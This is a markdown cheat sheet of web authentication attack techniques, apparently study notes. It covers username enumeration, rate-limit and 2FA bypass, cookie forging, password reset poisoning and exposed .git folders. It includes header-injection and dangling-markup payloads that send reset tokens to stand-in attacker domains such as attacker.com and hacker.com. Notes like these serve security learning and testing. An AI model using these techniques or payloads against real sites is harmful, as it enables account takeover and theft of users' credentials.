## Password based login:
### Different response:
- Check for different response if correct username is entered
- Check for different response code
- Check for different response length

### Subtly different response:
- Sometimes the correct creds induce a very minor change in response

### Enumeration through response timing:
- input a long ass password so that the correct username takes longer to process
- X-Forwarded-For header to bypass rate limiting through IP

### IP Block bypass by providing correct creds:
- In some implementations, the counter for the number of failed attempts resets if the IP owner logs in successfully

### Enumeration through account locking:
- If one username is attempted multiple times the account might get locked implying that the username is valid.

### If Data is being sent in JSON format:
- Try sending a list of passwords.

## 2FA Bypass:
### Bypass 2FA entirely:
- Try to skip the 2FA step completely by skipping that request and accessing the latter page.

### - Bypass 2FA by brute-force
- If you get a guessable cookie after the first authentication step, you can try to guess that cookie for another account and also brute-force their 2FA code.

## Other Authentication functionalities:
### Stay-Logged-in cookie:
- If you can figure out the construction of the stay-logged-in cookie you can possibly access other accounts, sometimes they are a mix of usernames, passwords and timestamps, encoded in base64 or something else. Try to understand the logic and brute-force the cookie.

### Offline password cracking:
- If you can get hold of the cookie of the victim for example through XSS. You can then try to crack it if you know the logic with which it was created. Or try to brute-force it.

### Password reset:
- The attacker can request the password reset form from his own account and change the username to victims, if that doesn't work he can try to remove the password reset token from the request completely.

### - Password reset poisoning:
- Try changing the host header to sub.evil-user.net (Attacker controlled domain) or try changing incorporating the X-Forwarded-Host header with the value sub.evil-user.com (Attacker controlled domain)

- You can also try to reset the password via dangling markup, just try to inject dangling html inside the Host header or X-Forwarded-Host header. 
- Example: "><img src="https://hacker.com/?
- Or if it raises an error try to inject it inside the port value.
- Example: Host: normal-website.com:arbitraryport"<a href="https://attacker.com/?

### Password reset form:
- Most password forms have three input fields, current password and new password(x2), we can try bruteforcing the current password of any other user through here.

### Version control history
- Virtually all websites are developed using some form of version control system, such as Git. By default, a Git project stores all of its version control data in a folder called .git. Occasionally, websites expose this directory in the production environment. In this case, you might be able to access it by simply browsing to /.git.